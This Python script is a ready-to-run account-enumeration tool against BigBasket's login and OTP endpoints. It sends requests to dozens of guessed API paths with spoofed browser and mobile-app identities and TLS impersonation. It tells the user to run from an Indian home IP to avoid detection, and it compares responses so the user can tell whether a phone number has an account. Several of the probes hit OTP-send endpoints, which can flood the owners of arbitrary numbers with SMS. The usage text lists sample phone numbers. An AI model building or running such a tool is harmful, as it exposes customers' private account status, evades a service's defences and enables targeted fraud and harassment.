#!/usr/bin/env python3
"""
BigBasket Silent-Check Diagnostic
=================================
Run on an INDIAN residential / home IP (not AWS / datacenter).

  pip install curl_cffi

  python bigbasket_diag.py 9927936712
  python bigbasket_diag.py 9927936712 9027936246
  python bigbasket_diag.py --save 9927936712

Dumps every response so you can spot which path returns
REGISTERED / NOT_REGISTERED without sending SMS.
"""

from __future__ import annotations

import argparse
import json
import sys
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

try:
    from curl_cffi import requests as creq
except ImportError:
    print("Install:  pip install curl_cffi")
    sys.exit(1)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def norm_mobile(raw: str) -> str:
    digits = "".join(c for c in str(raw) if c.isdigit())
    if len(digits) >= 10:
        return digits[-10:]
    return digits


def short(text: str | None, n: int = 600) -> str:
    if not text:
        return ""
    t = text.replace("\r", "").strip()
    return t if len(t) <= n else t[:n] + f"...[+{len(t) - n} chars]"


def jdump(obj: Any) -> str:
    try:
        return json.dumps(obj, indent=2, ensure_ascii=False, default=str)
    except Exception:
        return str(obj)


def make_visitor() -> str:
    return str(uuid.uuid4())


def make_device() -> str:
    return str(uuid.uuid4())


# ---------------------------------------------------------------------------
# Endpoint matrix
# ---------------------------------------------------------------------------

def build_endpoints(mobile: str) -> list[dict]:
    """Every known / guessed BigBasket auth surface."""
    m = mobile
    m91 = f"+91{mobile}"
    visitor = make_visitor()
    device = make_device()

    # Common payloads
    id_only = {"identifier": m}
    id_91 = {"identifier": m91}
    mobile_no = {"mobile_no": m}
    mobile_no_91 = {"mobile_no": m91}
    mixed = {"identifier": m, "mobile_no": m}
    mixed_91 = {"identifier": m91, "mobile_no": m91}
    app_otp = {
        "mobile_no": m,
        "identifier": m,
        "visitor_id": visitor,
        "device_id": device,
    }
    app_otp_full = {
        "mobile_no": m,
        "identifier": m,
        "visitor_id": visitor,
        "device_id": device,
        "channel": "BB-ANDROID",
        "source": "login",
    }

    hosts_paths = [
        # --- classic mapi member-svc ---
        ("POST", "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/", [id_only, id_91, mobile_no, mixed]),
        ("POST", "https://www.bigbasket.com/mapi/v3.4.0/member-svc/otp/send/", [id_only, mobile_no]),
        ("POST", "https://www.bigbasket.com/mapi/v4.0.0/member-svc/login/", [mobile_no, mixed]),
        ("POST", "https://www.bigbasket.com/mapi/v4.0.0/member-svc/member/check/", [mobile_no, id_only]),
        ("POST", "https://www.bigbasket.com/mapi/v4.0.0/member-svc/exists/", [id_only, mobile_no]),
        ("POST", "https://www.bigbasket.com/mapi/v4.0.0/member-svc/validate/", [id_only, mobile_no]),
        ("POST", "https://www.bigbasket.com/mapi/v4.0.0/member-svc/member/exists/", [id_only]),
        ("POST", "https://www.bigbasket.com/mapi/v4.0.0/member-svc/check-user/", [id_only, mobile_no]),
        ("GET",  f"https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/?identifier={m}", [None]),
        ("GET",  f"https://www.bigbasket.com/mapi/v4.0.0/member-svc/member/?mobile_no={m}", [None]),

        # --- auth / web ---
        ("POST", "https://www.bigbasket.com/auth/otp/send/", [id_only, mobile_no]),
        ("POST", "https://www.bigbasket.com/auth/login/", [mobile_no, id_only]),
        ("POST", "https://www.bigbasket.com/auth/v1/otp/send/", [id_only]),
        ("POST", "https://www.bigbasket.com/auth/v1/check/", [mobile_no]),

        # --- member-tdl (mobile app style) ---
        ("POST", "https://www.bigbasket.com/member-tdl/v3/member/otp/", [app_otp, app_otp_full, mobile_no]),
        ("POST", "https://www.bigbasket.com/member-tdl/v3/member/otp/send/", [app_otp, mobile_no]),
        ("POST", "https://www.bigbasket.com/member-tdl/v2/member/otp/", [app_otp]),
        ("POST", "https://www.bigbasket.com/member-tdl/v1/member/otp/", [app_otp]),
        ("POST", "https://www.bigbasket.com/member-tdl/v3/member/check/", [mobile_no, app_otp]),
        ("POST", "https://www.bigbasket.com/member-tdl/v3/member/exists/", [mobile_no]),
        ("POST", "https://www.bigbasket.com/member-tdl/v3/member/validate/", [mobile_no]),
        ("POST", "https://www.bigbasket.com/member-tdl/v3/member/login/", [mobile_no]),

        # --- ui-svc ---
        ("POST", "https://www.bigbasket.com/ui-svc/v1/member/otp/send/", [id_only, mobile_no]),
        ("POST", "https://www.bigbasket.com/ui-svc/v1/member/check/", [mobile_no]),
        ("GET",  f"https://www.bigbasket.com/ui-svc/v1/member/?mobile={m}", [None]),

        # --- possible app gateways / aliases ---
        ("POST", "https://bbapi.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/", [id_only]),
        ("POST", "https://api.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/", [id_only]),
        ("POST", "https://www.bbdaily.com/mapi/v4.0.0/member-svc/otp/send/", [id_only]),
        ("POST", "https://bbdaily.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/", [id_only]),
        ("POST", "https://www.bbnow.com/mapi/v4.0.0/member-svc/otp/send/", [id_only]),
        ("POST", "https://bbnow.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/", [id_only]),

        # --- Tata Neu style guesses ---
        ("POST", "https://www.bigbasket.com/gateway/auth/v1/otp/send/", [id_only]),
        ("POST", "https://www.bigbasket.com/gateway/auth/v1/check/", [mobile_no]),
        ("POST", "https://www.bigbasket.com/gateway/member/v1/exists/", [id_only]),
    ]

    out: list[dict] = []
    for method, url, payloads in hosts_paths:
        for i, body in enumerate(payloads):
            out.append({
                "method": method,
                "url": url,
                "body": body,
                "tag": f"{method} {url.split('bigbasket.com')[-1].split('bbdaily')[-1].split('bbnow')[-1][:60]} #{i}",
            })
    return out


HEADER_SETS = {
    "web": {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/131.0.0.0 Safari/537.36"
        ),
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://www.bigbasket.com",
        "Referer": "https://www.bigbasket.com/",
        "X-Channel": "BB-WEB",
        "X-Caller": "DVAR-SVC",
        "X-Requested-With": "XMLHttpRequest",
    },
    "android": {
        "User-Agent": "BigBasket/8.15.0 (Linux; Android 13; Pixel 7) okhttp/4.12.0",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "X-Channel": "BB-ANDROID",
        "X-Caller": "MEMBER-SVC",
        "X-Entry-Context": "bb-android",
        "X-Entry-Context-Id": "100",
        "bb-decoded-token-mid": "0",
    },
    "ios": {
        "User-Agent": "BigBasket/8.14.0 (iPhone; iOS 17.2; Scale/3.00)",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "X-Channel": "BB-IOS",
        "X-Caller": "MEMBER-SVC",
    },
}


# ---------------------------------------------------------------------------
# Core probe
# ---------------------------------------------------------------------------

def warm_session(s: creq.Session) -> dict:
    info = {"home_status": None, "cookies": [], "title_snip": ""}
    try:
        r = s.get("https://www.bigbasket.com/", timeout=20)
        info["home_status"] = r.status_code
        info["cookies"] = list(s.cookies.keys())
        info["title_snip"] = short(r.text, 120)
    except Exception as e:
        info["home_error"] = str(e)
    return info


def probe_one(
    s: creq.Session,
    method: str,
    url: str,
    body: dict | None,
    headers: dict,
) -> dict:
    result: dict[str, Any] = {
        "method": method,
        "url": url,
        "body": body,
        "http": None,
        "json": None,
        "text": None,
        "error": None,
        "elapsed_ms": None,
    }
    t0 = time.time()
    try:
        if method == "GET":
            r = s.get(url, headers=headers, timeout=15)
        else:
            r = s.post(url, json=body, headers=headers, timeout=15)
        result["http"] = r.status_code
        result["elapsed_ms"] = int((time.time() - t0) * 1000)
        text = r.text or ""
        result["text"] = text
        try:
            result["json"] = r.json()
        except Exception:
            result["json"] = None
    except Exception as e:
        result["error"] = f"{type(e).__name__}: {e}"
        result["elapsed_ms"] = int((time.time() - t0) * 1000)
    return result


def interesting(resp: dict) -> bool:
    """Flag responses that might contain registration signals."""
    if resp.get("error"):
        return False
    code = resp.get("http")
    if code is None:
        return False
    if code in (403, 404, 502, 503):
        # still show short body for 403 if JSON-ish
        j = resp.get("json")
        if isinstance(j, dict) and j:
            return True
        return False
    j = resp.get("json")
    if isinstance(j, dict) and j:
        return True
    text = (resp.get("text") or "").lower()
    keys = (
        "register", "exists", "member", "otp", "user", "account",
        "new", "guest", "verified", "found", "not_found", "is_new",
        "success", "error_code", "message", "status",
    )
    return any(k in text for k in keys)


def run_mobile(mobile: str, header_mode: str = "all") -> dict:
    mobile = norm_mobile(mobile)
    if len(mobile) != 10:
        return {"status": "ERROR", "error": "need 10-digit mobile", "mobile": mobile}

    report: dict[str, Any] = {
        "mobile": mobile,
        "ts": datetime.now(timezone.utc).isoformat(),
        "warm": {},
        "hits": [],
    }

    modes = list(HEADER_SETS.keys()) if header_mode == "all" else [header_mode]
    endpoints = build_endpoints(mobile)

    for mode in modes:
        print(f"\n{'='*64}")
        print(f"  HEADER PROFILE: {mode.upper()}   |  mobile={mobile}")
        print(f"{'='*64}")

        s = creq.Session(impersonate="chrome131")
        warm = warm_session(s)
        report["warm"][mode] = warm
        print(f"  [warm] home={warm.get('home_status')} cookies={warm.get('cookies')}")

        headers = dict(HEADER_SETS[mode])
        # inject csrf if present
        if "csrftoken" in s.cookies:
            headers["X-CSRFToken"] = s.cookies["csrftoken"]

        for ep in endpoints:
            tag = f"[{mode}] {ep['method']} {ep['url']}"
            body_tag = ""
            if ep["body"] is not None:
                body_tag = " body=" + json.dumps(ep["body"], ensure_ascii=False)[:80]
            print(f"\n  → {ep['method']} {ep['url']}")
            if ep["body"] is not None:
                print(f"    payload: {json.dumps(ep['body'], ensure_ascii=False)}")

            resp = probe_one(s, ep["method"], ep["url"], ep["body"], headers)
            resp["header_mode"] = mode
            resp["tag"] = tag + body_tag
            report["hits"].append(resp)

            if resp.get("error"):
                print(f"    ERR  {resp['error']}")
                continue

            http = resp["http"]
            print(f"    HTTP {http}  ({resp['elapsed_ms']} ms)")

            if resp.get("json") is not None:
                print("    JSON:")
                print("    " + jdump(resp["json"]).replace("\n", "\n    "))
            else:
                print("    TEXT:", short(resp.get("text"), 350))

            if interesting(resp):
                print("    ★ INTERESTING — inspect this response")

            time.sleep(0.35)  # gentle pacing

    return report


def pretty_summary(report: dict) -> None:
    print("\n" + "=" * 64)
    print("  SUMMARY — candidates worth manual review")
    print("=" * 64)
    found = 0
    for h in report.get("hits", []):
        if not interesting(h):
            continue
        found += 1
        print(f"\n[{h.get('header_mode')}] HTTP {h.get('http')}  {h.get('url')}")
        if h.get("body"):
            print("  req:", json.dumps(h["body"], ensure_ascii=False)[:120])
        if h.get("json") is not None:
            print("  json:", jdump(h["json"])[:500])
        else:
            print("  text:", short(h.get("text"), 200))
    if not found:
        print("  (no JSON / signal-like responses — try Indian home IP or real Chrome cookies)")
    print()


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main() -> None:
    ap = argparse.ArgumentParser(description="BigBasket auth endpoint diagnostic")
    ap.add_argument("mobiles", nargs="+", help="10-digit mobile(s)")
    ap.add_argument(
        "--headers",
        choices=["all", "web", "android", "ios"],
        default="all",
        help="header profile (default: all)",
    )
    ap.add_argument(
        "--save",
        action="store_true",
        help="write full JSON report to bb_diag_<mobile>_<ts>.json",
    )
    args = ap.parse_args()

    all_reports = []
    for raw in args.mobiles:
        mobile = norm_mobile(raw)
        print(f"\n\n######## DIAG START  mobile={mobile}  ########")
        report = run_mobile(mobile, header_mode=args.headers)
        pretty_summary(report)
        all_reports.append(report)

        if args.save:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            path = Path(f"bb_diag_{mobile}_{ts}.json")
            path.write_text(jdump(report), encoding="utf-8")
            print(f"[+] full report saved → {path.resolve()}")

    # cross-number hint
    if len(all_reports) >= 2:
        print("\n" + "=" * 64)
        print("  TIP: Compare JSON fields between REGISTERED vs NOT_REGISTERED numbers.")
        print("  Any key that differs (exists / is_new / member_id / status) is the signal.")
        print("=" * 64)


if __name__ == "__main__":
    main()
